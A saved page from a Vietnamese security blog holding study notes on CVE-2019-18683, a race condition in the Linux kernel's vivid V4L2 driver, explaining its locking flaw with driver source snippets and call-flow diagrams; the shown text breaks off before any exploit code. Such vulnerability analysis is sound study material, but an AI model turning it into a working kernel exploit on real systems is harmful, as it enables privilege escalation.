        return null;
      }

      if (e.key === 'Escape') {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      }

      var items = document.querySelectorAll('#search-menu .dropdown-item');
      var keyCode = e.which || e.keyCode;

      if (!items || !items.length) {
        return null;
      }
      
      if (e.key === 'ArrowDown' || keyCode === 40) {
        if (activeIndex === null) {
          activeIndex = 0;
          items[activeIndex].classList.remove('is-active');
        } else {
          items[activeIndex].classList.remove('is-active');
          activeIndex = activeIndex === items.length - 1 ? 0 : activeIndex + 1;
        }
        items[activeIndex].classList.add('is-active');

        let overflowedPixel = items[activeIndex].offsetTop + items[activeIndex].clientHeight - searchContainerMaxHeight;
        if (overflowedPixel > 0) {
          document.querySelector(".search-content").scrollTop += items[activeIndex].getBoundingClientRect().height;
        } else if (activeIndex === 0) {
          document.querySelector(".search-content").scrollTop = 0;
        }
      } else if (e.key === 'ArrowUp' || keyCode === 38) {
        if (activeIndex === null) {
          activeIndex = items.length - 1;
          items[activeIndex].classList.remove('is-active');
        } else {
          items[activeIndex].classList.remove('is-active');
          activeIndex = activeIndex === 0 ? items.length - 1 : activeIndex - 1;
        }
        items[activeIndex].classList.add('is-active');
        
        let overflowedPixel = items[activeIndex].offsetTop + items[activeIndex].clientHeight - searchContainerMaxHeight;
        if (overflowedPixel < 0) {
          document.querySelector(".search-content").scrollTop -= items[activeIndex].getBoundingClientRect().height;
        } else {
          document.querySelector(".search-content").scrollTop = overflowedPixel + items[activeIndex].getBoundingClientRect().height;
        }
      } else if (e.key === 'Enter' || keyCode === 13) {
        if (items[activeIndex] && items[activeIndex].getAttribute('href')) {
          location.href = items[activeIndex].getAttribute('href');
        }
      } else if (e.key === 'Escape' || keyCode === 27) {
        e.target.value = null;
        if (searchResults) {
          searchResults.classList.remove('is-active');
        }
      }
    }) : null;

    searchMobile ? 
    searchMobile.addEventListener('input', function(e) {
      if (!e.target.value) {
        let wrap = document.getElementById('search-mobile-results');
        while (wrap.firstChild) {
          wrap.removeChild(wrap.firstChild);
        }
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);
      renderSearchResultsMobile(searchText, results);
      if (enableSearchHighlight) {
        renderSearchHighlightResultsMobile(searchText, results);
      } else {
        renderSearchResultsMobile(searchText, results);
      }
    }) : null;
  


  
    var mobileSearchInputElem = document.querySelector('#search-mobile');
    var mobileSearchClassElem = document.querySelector('.mobile-search');
    var mobileSearchBtnElems = document.querySelectorAll('.navbar-search');
    var mobileSearchCloseBtnElem = document.querySelector('#search-mobile-close');
    var mobileSearchContainer = document.querySelector('#search-mobile-container');
    var mobileSearchResultsElem = document.querySelector('#search-mobile-results');
    var htmlElem = document.querySelector('html');

    if (mobileSearchClassElem) {
      mobileSearchClassElem.style.display = 'none';
    }

    mobileSearchBtnElems ? 
    mobileSearchBtnElems.forEach(function (elem, idx) {
      elem.addEventListener('click', function () {
        if (mobileSearchContainer) {
          mobileSearchContainer.style.display = 'block';
        }

        if (mobileSearchInputElem) {
          mobileSearchInputElem.focus();
        }

        if (htmlElem) {
          htmlElem.style.overflowY = 'hidden';
        }
      });
    }) : null;

    mobileSearchCloseBtnElem ? 
    mobileSearchCloseBtnElem.addEventListener('click', function() {
      if (mobileSearchContainer) {
        mobileSearchContainer.style.display = 'none';
      }

      if (mobileSearchInputElem) {
        mobileSearchInputElem.value = '';
      }
      
      if (mobileSearchResultsElem) {
        while (mobileSearchResultsElem.firstChild) {
          mobileSearchResultsElem.removeChild(mobileSearchResultsElem.firstChild);
        }
      }

      if (htmlElem) {
        htmlElem.style.overflowY = 'visible';
      }
    }) : null;

    mobileSearchInputElem ?
    mobileSearchInputElem.addEventListener('keydown', function(e) {
      var keyCode = e.which || e.keyCode;
      if (e.key === 'Escape' || keyCode === 27) {
        if (mobileSearchContainer) {
          mobileSearchContainer.style.display = 'none';
        }
        
        if (mobileSearchInputElem) {
          mobileSearchInputElem.value = '';
        }

        if (mobileSearchResultsElem) {
          while (mobileSearchResultsElem.firstChild) {
            mobileSearchResultsElem.removeChild(mobileSearchResultsElem.firstChild);
          }
        }
        if (htmlElem) {
          htmlElem.style.overflowY = 'visible';
        }
      }
    }) : null;
  


  
    function renderSearchResultsMain(searchText, results) {
      var searchBody = document.querySelector('.search-result__body');
      var originUl = searchBody.querySelector('ul');
      var ul = document.createElement('ul');
      
      if (!searchText) {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      } else if (results) {
        if (results && results.length) {
          results.forEach(function (result) {
            makeLi(ul, result);
          });

          searchResult ? searchResult.setAttribute('data-display', 'block') : null;
          summaryContainer ? summaryContainer.setAttribute('data-display', 'none') : null;
        }
      }

      originUl.parentNode.replaceChild(ul, originUl);
    }

    function renderSearchHighlightResultsMain(searchText, results) {
      var searchBody = document.querySelector('.search-result__body');
      var originUl = searchBody.querySelector('ul');
      var ul = document.createElement('ul');

      if (!searchText) {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      } else if (results) {
        if (results && results.length) {
          results.forEach(function (result) {
            makeHighlightLi(ul, result);
          });

          searchResult ? searchResult.setAttribute('data-display', 'block') : null;
          summaryContainer ? summaryContainer.setAttribute('data-display', 'none') : null;
        }
      }

      originUl.parentNode.replaceChild(ul, originUl);
    }
  
  });
</script>
    
    


<link rel="stylesheet" href="/css/main.min.css">


    
<meta name="description" content="Khai thác lỗ hổng nhân Linux trong hệ thống con V4L2 (chưa xong)" />


<meta name="keywords" content="cve, linux kernel, V4l2">

<meta name="created" content="2020-08-03T00:00:00&#43;0000">
<meta name="modified" content="2020-08-03T00:00:00&#43;0000">
<meta property="article:published_time" content="2020-08-03T00:00:00&#43;0000">

<meta name="author" content="Edisc">
<meta property="article:author" content="https://minhlongmt183.github.io/posts/cve-2019-18683/@Edisc">


<meta property="og:site_name" content="Edisc Blog">
<meta property="og:title" content="Tìm hiểu về CVE-2019-18683">
<meta property="og:url" content="https://minhlongmt183.github.io/posts/cve-2019-18683/">
<meta property="og:type" content="article">
<meta property="og:description" content="Khai thác lỗ hổng nhân Linux trong hệ thống con V4L2 (chưa xong)">

  
    <meta property="og:image" content="https://minhlongmt183.github.io/images/posts/CVE-2019-18683/v4l2_objects.png">
    <meta property="og:image:url" content="https://minhlongmt183.github.io/images/posts/CVE-2019-18683/v4l2_objects.png">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:app:name:iphone" content="Edisc Blog">
    <meta property="twitter:title" content="Tìm hiểu về CVE-2019-18683">
    <meta property="twitter:description" content="Khai thác lỗ hổng nhân Linux trong hệ thống con V4L2 (chưa xong)">
  

<meta name="generator" content="Hugo 0.68.3" />
<meta name="msapplication-TileColor" content="#fff">

<meta name="theme-color" content="#fff">

<meta name="msapplication-navbutton-color" content="#fff">

<meta name="apple-mobile-web-app-status-bar-style" content="#fff">

<link rel="canonical" href="https://minhlongmt183.github.io/posts/cve-2019-18683/">

<link rel="manifest" href="/manifest.json">

  <link rel="apple-touch-icon" sizes="57x57" href="/favicon/apple-icon-57x57.png">
  <link rel="apple-touch-icon" sizes="60x60" href="/favicon/apple-icon-60x60.png">
  <link rel="apple-touch-icon" sizes="72x72" href="/favicon/apple-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="76x76" href="/favicon/apple-icon-76x76.png">
  <link rel="apple-touch-icon" sizes="114x114" href="/favicon/apple-icon-114x114.png">
  <link rel="apple-touch-icon" sizes="120x120" href="/favicon/apple-icon-120x120.png">
  <link rel="apple-touch-icon" sizes="144x144" href="/favicon/apple-icon-144x144.png">
  <link rel="apple-touch-icon" sizes="152x152" href="/favicon/apple-icon-152x152.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-icon-180x180.png">
  <link rel="icon" type="image/png" sizes="192x192" href="/favicon/android-icon-192x192.png">
  <link rel="icon" type="image/png" sizes="192x192" href="/favicon/android-icon-512x512.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="96x96" href="/favicon/favicon-96x96.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png">
  <meta name="msapplication-TileColor" content="#ffffff">
  <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">


    <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "WebPage",
    "headline": "Tìm hiểu về CVE-2019-18683",
    "datePublished": "2020-08-03T00:00:00Z",
    "dateModified": "2020-08-03T00:00:00Z",
    "url" : "https://minhlongmt183.github.io/posts/cve-2019-18683/",
    "description": "Khai thác lỗ hổng nhân Linux trong hệ thống con V4L2 (chưa xong)",
    "keywords": ["cve, linux kernel, V4l2"],
    "image" : "https://minhlongmt183.github.io/images/posts/CVE-2019-18683/v4l2_objects.png",
    "author": {
      "@type": "Person",
      "name": "Edisc"
    },
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https://minhlongmt183.github.io/"
    },
    "publisher": {
      "@type": "Organization",
      "name": "Edisc Blog",
      "url": "https://minhlongmt183.github.io/"
    }
  }
</script>

    
  
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'G-G6WT3WSKMH', 'auto');
	
	ga('send', 'pageview');
}
</script>

  
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'G-G6WT3WSKMH', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>








    <link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
</head>

<body id="root" class="theme__dark">
    <script>
        var localTheme = localStorage.getItem('theme');
        if (localTheme) {
            document.getElementById('root').className = 'theme__' + localTheme;
        }
    </script>
    <div id="container">
        





        <div class="wrapper" data-type="posts" data-kind="page">
            <nav class="navbar scrolling" role="navigation" aria-label="main navigation" data-dir="ltr">
  <div class="navbar__brand">
    
    <a href="/" title="Home" rel="home" class="navbar__logo-link">
      <img src="/logo.png" alt="Home" class="navbar__logo">
    </a>
    
    
      <a href="/" title="Home" rel="home" class="navbar__title-link">
        <h6 class="navbar__title">Edisc</h6>
      </a>
    
  </div>

  
<div class="theme theme-mobile" data-ani="true">
  <div class="dropdown">
    <button class="dropdown-trigger navbar__slide-down" aria-label="Select Theme Button" style="" data-ani="true">
      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path fill="none" d="M24 0H0v24h24V0z"/><path fill="currentColor" d="M6.34 7.93c-3.12 3.12-3.12 8.19 0 11.31C7.9 20.8 9.95 21.58 12 21.58s4.1-.78 5.66-2.34c3.12-3.12 3.12-8.19 0-11.31l-4.95-4.95c-.39-.39-1.02-.39-1.41 0L6.34 7.93zM12 19.59c-1.6 0-3.11-.62-4.24-1.76C6.62 16.69 6 15.19 6 13.59s.62-3.11 1.76-4.24L12 5.1v14.49z"/></svg>      
    </button>
    <div class="dropdown-content select-theme">
      
        
        <a href="#" class="dropdown-item select-theme__item is-active">
          dark
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          light
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          hacker
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          solarized
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          kimbie
        </a>
        
      
    </div>
  </div>
</div>


<div class="mobile-search__btn navbar-search" data-ani="true">
  <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="currentColor" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path d="M15.5 14h-.79l-.28-.27c1.2-1.4 1.82-3.31 1.48-5.34-.47-2.78-2.79-5-5.59-5.34-4.23-.52-7.79 3.04-7.27 7.27.34 2.8 2.56 5.12 5.34 5.59 2.03.34 3.94-.28 5.34-1.48l.27.28v.79l4.25 4.25c.41.41 1.08.41 1.49 0 .41-.41.41-1.08 0-1.49L15.5 14zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
</div>

<div id="search-mobile-container" class="mobile-search hide" data-dir="ltr">
  <div class="mobile-search__top">
    <input id="search-mobile" type="text" aria-label="Mobile Search" placeholder="Search" class="mobile-search__top--input"/>
    <div id="search-mobile-close" class="mobile-search__top--icon">
      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path opacity=".87" fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm3.59-13L12 10.59 8.41 7 7 8.41 10.59 12 7 15.59 8.41 17 12 13.41 15.59 17 17 15.59 13.41 12 17 8.41z"/></svg>
    </div>
  </div>
  <div id="search-mobile-results" class="mobile-search__body">
    
  </div>
</div>


<a role="button" class="navbar__burger" aria-label="menu" aria-expanded="false"
  data-ani="true">
  <span aria-hidden="true"></span>
  <span aria-hidden="true"></span>
  <span aria-hidden="true"></span>
</a>
<div class="navbarm__collapse" data-open="false">
  <ul dir="ltr">
    
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/about">About</a>
        </li>
      
      
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/archive">Archive</a>
        </li>
      
      
    
      
      
      
      

      
        <li class="navbarm__menu--item active">
          <a href="/posts">Posts</a>
        </li>
      
      
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/contact">Contact</a>
        </li>
      
      
    

    
      <li class="navbarm__menu--item ">
        <a href="/tags" class="navbarm__menu--term" data-index="0">
          Tags
        </a>
      </li>
    
      <li class="navbarm__menu--item ">
        <a href="/categories" class="navbarm__menu--term" data-index="1">
          Categories
        </a>
      </li>
    
      <li class="navbarm__menu--item ">
        <a href="/series" class="navbarm__menu--term" data-index="2">
          Series
        </a>
      </li>
    
  </ul>
</div>
  <div class="navbar__menu">
  
  
  
<div class="theme" data-ani="true">
  <div class="dropdown">
    <button class="dropdown-trigger navbar__slide-down" aria-label="Select Theme Button" data-ani="true">
      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path fill="none" d="M24 0H0v24h24V0z"/><path fill="currentColor" d="M6.34 7.93c-3.12 3.12-3.12 8.19 0 11.31C7.9 20.8 9.95 21.58 12 21.58s4.1-.78 5.66-2.34c3.12-3.12 3.12-8.19 0-11.31l-4.95-4.95c-.39-.39-1.02-.39-1.41 0L6.34 7.93zM12 19.59c-1.6 0-3.11-.62-4.24-1.76C6.62 16.69 6 15.19 6 13.59s.62-3.11 1.76-4.24L12 5.1v14.49z"/></svg>      
    </button>
    <div class="dropdown-content select-theme">
      
        
        <a href="#" class="dropdown-item select-theme__item is-active">
          dark
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          light
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          hacker
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          solarized
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          kimbie
        </a>
        
      
    </div>
  </div>
</div>

  
  
  
  
  
  
  
  <a href="/about" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">About</a>
  
  
  
  
  
  
  
  <a href="/archive" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">Archive</a>
  
  
  
  
  
  
  
  <a href="/posts" class="navbar__menu-item navbar__slide-down active" dir="ltr" data-ani="true">Posts</a>
  
  
  
  
  
  
  
  <a href="/contact" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">Contact</a>
  
  
</div>
</nav>
            
            

<main class="single__main main">
  
    <nav class="breadcrumb hide" aria-label="breadcrumbs">
  <script>document.querySelector('.breadcrumb').classList.remove('hide')</script>
  <ol>
    
  
  
  
  
  
  <li >
    
      <a href="https://minhlongmt183.github.io/" class="capitalize">Edisc Blog</a>
    
  </li>
  
  
  <li >
    
      <a href="https://minhlongmt183.github.io/posts/" class="capitalize">Posts</a>
    
  </li>
  
  
  <li  class="is-active" >
    
      <span>Tìm hiểu về CVE-2019-18683</span>
    
  </li>
  
  </ol>
  
</nav>
  
  
  <div class="single ">
    <div class="single__nojs">This page looks best with JavaScript enabled</div>
    <script>document.querySelector('.single').classList.remove('hide'); document.querySelector('.single__nojs').classList.add('hide');</script>
    <h2 class="single__title" data-ani="true">Tìm hiểu về CVE-2019-18683</h2>
    <h3 class="single__subtitle"></h3>
    <div class="single__meta">
      
<div class="single__infos">
  <time class="single__info" title="Written At">📅&nbsp;Aug 3, 2020 </time>
  
  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;25&nbsp;min read </span>
  
  &nbsp;&middot;&nbsp; <span class="single__info" title="WRITTEN BY">🐉&nbsp;Edisc</span>
  
  <span class="single__info">
    
  </span>
</div>

      
<ul class="single__tags caption">
  
  🏷️
  

  <li><a href="https://minhlongmt183.github.io/tags/cve-linux-kernel-v4l2/" class="single__tag" title="cve, linux kernel, V4l2">#cve, linux kernel, V4l2</a></li>

</ul>

    </div>
    <article class="single__contents" data-dir="ltr" data-ani="true">
      
      <div class="notices info" data-title="Info">
  <em>Bài viết này nhằm mục đích ghi lại những kiến thức đã học để nhớ và hiểu rõ hơn. Bài viết tham khảo chủ yếu từ <a href="https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html">CVE-2019-18683: Exploiting a Linux kernel vulnerability in the V4L2 subsystem</a></em>
</div>
<h2 id="vulnerabilities">Vulnerabilities</h2>
<div class="notices info" data-title="Info">
  chúng ta tải source code kernel về và xem tại: linux-x/drivers/media/platform/vivid/
</div>
<ul>
<li>Lỗ hổng bắt nguồn từ sai sót trong hiện thực, sử dụng mutex lock của driver <code>vivid</code> trong subsystem <code>V4L2 - (drivers/media/platform/vivid)</code>. Driver này không yêu cầu bất cứ phần cứng đặc biệt nào. Nó đóng vai trò như một kernel module (<code>CONFIG_VIDEO_VIVID=m</code>) trong các hệ điều hành như: Ubuntu, Debian, Arch Linux, SUSE Linux Enterprise, and openSUSE.</li>
<li>Driver <code>vivid</code> mô phỏng phần cứng <code>video4linux</code> của nhiều loại: video capture, video output, radio receivers and transmitters and a software defined radio receivers. Những input và output sẽ hoạt động giống như những thiết bị vật lí thật, do đó, nó cho phép ứng dụng thực hiện mà không cần bất cứ thiết bị phần cứng đặc biệt nào.</li>
<li>Trên Ubuntu, những thiết bị được tạo bởi driver <code>vivid</code> đều hoạt động cho người dùng bình thường, vì ubuntu sử dụng <a href="https://docs.oracle.com/cd/E19455-01/805-7229/6j6q8svdb/index.html"><code>RW USAL</code></a> khi người dùng đăng nhập</li>
</ul>
<h2 id="open-read-và-close-trong-vivid">open, read và close trong vivid</h2>
<h3 id="open">open</h3>
<p>Hàm này thì không có gì đặc biệt với trường hợp lỗi này, nó chỉ đơn giản được gọi để bật thiết bị</p>
<h3 id="read">read</h3>
<p>Chúng ta cùng theo flow của lệnh <code>read</code> này</p>
<pre><code class="language-mermaid" data-lang="mermaid">stateDiagram
read --&gt; vfd_read
vfd_read --&gt; vb2_fop_read
vb2_fop_read --&gt; __vb2_perform_fileio
__vb2_perform_fileio --&gt; vb2_core_reqbufs
vb2_core_reqbufs --&gt; vb_queue_alloc
__vb2_perform_fileio --&gt; vb2_core_qbuf
__vb2_perform_fileio --&gt; vb2_core_streamon
vb2_core_streamon --&gt; vb2_start_streaming
vb2_start_streaming --&gt; __enqueue_in_driver
vb2_start_streaming --&gt; vbi_cap_start_streaming
__vb2_perform_fileio --&gt; vb2_core_dqbuf

</code></pre><ul>
<li><code>vb2_queue</code>: hàng đợi này sẽ chứa <code>vb2_buffer</code> của ứng dụng, được lưu ở `vb2_queue-&gt;bufs)</li>
<li><code>vb2_buffer</code>: lưu thông tin về các hoạt động của video stream. Khi lệnh <code>read</code> thực hiện, nó gọi <code>vb_queue_alloc</code> để cấp phát vùng nhớ (kmalloc-1k) để chứa những thông tin từ <code>vb2_buffer</code> và sau đó lấy những thông tin này ra để thực hiện.</li>
<li>Quá trình <code>data streaming</code> thực chất là quá trình viết và đọc từ buffer <code>vb2_buffer</code> được thêm vào <code>vb2_queue (vb2_queue-&gt;queued_list)</code></li>
<li>Điều chú ý ở đây, khóa <code>dev-&gt;mutex</code> của <code>vb2_fop_read</code> và khóa tại <code>vb2_queue-&gt;lock</code> là một khóa. <a href="https://elixir.bootlin.com/linux/v5.4/source/drivers/media/platform/vivid/vivid-core.c#L1117">xem hiện thực tại đây</a></li>
<li>Sau khi <code>vb_buffer</code> được thêm vào hàng đợi, chương trình sẽ bắt đầu streaming, gọi <code>vb2_start_streaming</code> để đưa dữ liệu vào <code>vb_buffer</code>. Quá trình này nó sẽ gọi <code>__enqueue_in_driver</code> để thêm buffer vào <code>vivid_dev</code>, hàng đợi <code>vid_cap_active</code> để được xử lí.</li>
<li>Quá trình trên tương đương với việc gọi hàm <code>vid_cap_buf_queue</code></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-objectivec" data-lang="objectivec"><span class="k">static</span> <span class="kt">void</span> <span class="nf">vid_cap_buf_queue</span><span class="p">(</span><span class="k">struct</span> <span class="n">vb2_buffer</span> <span class="o">*</span><span class="n">vb</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">vb2_v4l2_buffer</span> <span class="o">*</span><span class="n">vbuf</span> <span class="o">=</span> <span class="n">to_vb2_v4l2_buffer</span><span class="p">(</span><span class="n">vb</span><span class="p">);</span>
    <span class="k">struct</span> <span class="n">vivid_dev</span> <span class="o">*</span><span class="n">dev</span> <span class="o">=</span> <span class="n">vb2_get_drv_priv</span><span class="p">(</span><span class="n">vb</span><span class="o">-&gt;</span><span class="n">vb2_queue</span><span class="p">);</span>
    <span class="k">struct</span> <span class="n">vivid_buffer</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">container_of</span><span class="p">(</span><span class="n">vbuf</span><span class="p">,</span> <span class="k">struct</span> <span class="n">vivid_buffer</span><span class="p">,</span> <span class="n">vb</span><span class="p">);</span>

    <span class="n">spin_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">slock</span><span class="p">);</span>
    <span class="n">list_add_tail</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">list</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">vid_cap_active</span><span class="p">);</span><span class="c1">//
</span><span class="c1"></span>    <span class="n">spin_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">slock</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Sau đó gọi <code>vid_cap_start_streaming</code>, hàm này sẽ gọi <code>vivid_start_generating_vid_cap</code> để khởi tạo 1 kernel thread thực hiện hàm <code>vivid_thread_vid_caption</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-objectivec" data-lang="objectivec"><span class="n">dev</span><span class="o">-&gt;</span><span class="n">kthread_vid_cap</span> <span class="o">=</span> <span class="n">kthread_run</span><span class="p">(</span><span class="n">vivid_thread_vid_cap</span><span class="p">,</span> <span class="n">dev</span><span class="p">,</span>
            <span class="s">&#34;%s-vid-cap&#34;</span><span class="p">,</span> <span class="n">dev</span><span class="o">-&gt;</span><span class="n">v4l2_dev</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>Hàm <code>vivid_thread_vid_cap</code> này có nhiệm vụ đưa dữ liệu vào <code>vb2_buffer</code>. Sau dữ liệu được đưa xong, nó sẽ bước vòng 1 vòng lặp vô hạn, ngồi đợi lấy khóa <code>lock(mutex_lock(&amp;dev-&gt;mutex))</code>, khi nhận được khóa, dữ liệu trên <code>vb2_buffer</code> mới được xử lí.</li>
<li>Như đã nói, <code>vb2_fop_read</code> cũng có khóa, và khóa này với khóa ở bước trên <code>vivid_thread_vid_cap</code> là một, điều này có nghĩa, khi thread đang thực hiện <code>vivid_thread_vid_cap</code> mở khóa, một thread nào đó thực hiện <code>vb2_fop_read</code> có khóa, nó có thể vào vùng nhớ này để thực hiện. Giống như ngôi nhà chỉ có thể chưa 1 người, có 2 người giữ chìa khóa, khi 1 người bên trong đi ra, người còn lại nếu đang giữ chìa khóa, anh ta hoàn toàn có thể vào căn nhà. Căn nhà ở đây là <code>vb2_buf</code>, còn 2 người lần lượt là 2 thread đang chạy <code>vivid_thread_vid_cap</code> và <code>vb2_fop_read</code>.<br />
Nhưng tại sao đang giữ khóa rồi lại mở khóa, sau đó lại chờ có lại khóa, tôi vẫn chưa hiểu tại sao lại như thế, nhưng đây chính là nguyên nhân gây ra CVE này.</li>
<li>Quan sát kĩ hơn về hàm <code>vb2_core_dqbuf</code>:</li>
</ul>
<pre><code class="language-mermaid" data-lang="mermaid">stateDiagram
vb2_core_dqbuf --&gt; __vb2_get_done_vb
__vb2_get_done_vb --&gt; __vb2_wait_for_done_vb
__vb2_wait_for_done_vb --&gt; vb2_ops_wait_prepare
__vb2_wait_for_done_vb --&gt; vb2_ops_wait_finish

</code></pre><p>Ở đây, <code>vb2_ops_wait_prepare</code> sẽ trả khóa <code>vb2_queue-&gt;lock</code>, <code>vb2_ops_wait_finish</code> sẽ chờ nhận khóa và kết thúc.<br />
Hay nói cách khác, <code>vb2_core_dqbuf</code> sẽ trả khóa, <code>vivid_thread_vid_cap</code> có khóa sẽ vào thực hiện, <code>vb2_core_dqbuf</code> phải chờ <code>vivid_thread_vid_cap</code> thực hiện xong, đưa lại khóa rồi mới hoàn tất việc của mình.<br />
<strong>Vấn đề chính là ở bước này.</strong> giống như việc bạn mượn phòng trong vòng 45&rsquo; rồi bạn phải khóa phòng, đem chìa khóa xuống cho bảo vệ để bảo vệ lên kiểm tra, bảo vệ kiểm tra xong sẽ đưa lại chìa khóa cho bạn để bạn vào phòng tiếp. Nhưng trong quá trình bạn đem chìa khóa xuống cho bảo vệ thì 1 người khác có được chiếc chìa khóa này, họ hoàn toàn có thể vào phòng lúc này. Kì vọng của người lập trình là muốn <code>vivid_thread_vid_cap</code> đi vào khi <code>vb2_core_dqbuf</code> trả khóa, nhưng lúc này, nếu 1 process khác đang chạy và gọi <code>vb2_fop_read</code> thì họ sẽ có được chìa khóa này.</p>
<ul>
<li>Bên dưới là ảnh khi debug, có thể thấy mặc dù hàm <code>vivid_thread_vid_cap</code> đã thực thi xong hết rồi <code>vb2_fop_read</code> không kết thúc ngay, nó lại gọi <code>vb2_core_qbuf</code> một lần nữa. Khi đó, hàm này lại vào đọc dữ liệu mà vốn dĩ đà được thực hiện xong bởi 1 process khác. Khi nó gọi <code>__enqueue_in_driver</code>, <code>vb2_buffer</code> sẽ được thêm vào hàng đợi <code>dev-&gt;vid_cap_active</code> để thực hiện. Sau đó <code>vb2_fop_read</code> mới kết thúc. Điều này dẫn tới, sau khi <code>vb2_fop_read</code> kết thúc, thì địa <code>vb2_buffer</code> lại được lưu trong <code>dev-&gt;vid_cap_active</code> để chuẩn bị cho 1 process khác thực hiện.</li>
<li>Khi tìm hiểu về <code>dev-&gt;vid_cap_active</code> thì tôi thấy nó được sử dụng bởi 3 hàm: <code>vivid_thread_vid_cap</code>, <code>vid_cap_start_streaming</code> và <code>vivid_stop_generating_vid_cap</code>.
<ul>
<li><code>vivid_thread_vid_cap</code>: lấy tất cả dữ liệu trong hàng đợi <code>vid_cap_active</code> ra, do đó, sau khi thực hiện xong, buffer sẽ không còn trong hàng đợi.</li>
<li><code>vid_cap_start_streaming</code> mục đích chính là kiểm tra xem trạng thái của buffer và thực hiện một số chuyển đổi, sau khi thực hiện xong, buffer vẫn còn trong hàng đợi.</li>
<li><code>vivid_stop_generating_vid_cap</code> được dùng trong hàm <code>close(fd)</code>, dùng để xóa tất cả các dữ liệu trong hàng đợi, bao gồm cả buffer.</li>
</ul>
</li>
</ul>
<h3 id="close">close</h3>
<p>Chúng ta đã tìm hiểu về hàm <code>read</code> và thấy rằng sau khi thực hiện hàm read, <code>vb2_buffer</code> lại được 1 process khác đưa vào hàng đợi để chuẩn bị cho quá trình thực hiện. Vậy khi process hiện tại thực hiện xong lệnh <code>close</code> thì <code>vb2_buffer</code> sẽ bị ảnh hưởng như thế nào? Chúng ta hãy cùng xem flow khi gọi hàm <code>close</code></p>
<pre><code class="language-mermaid" data-lang="mermaid">stateDiagram
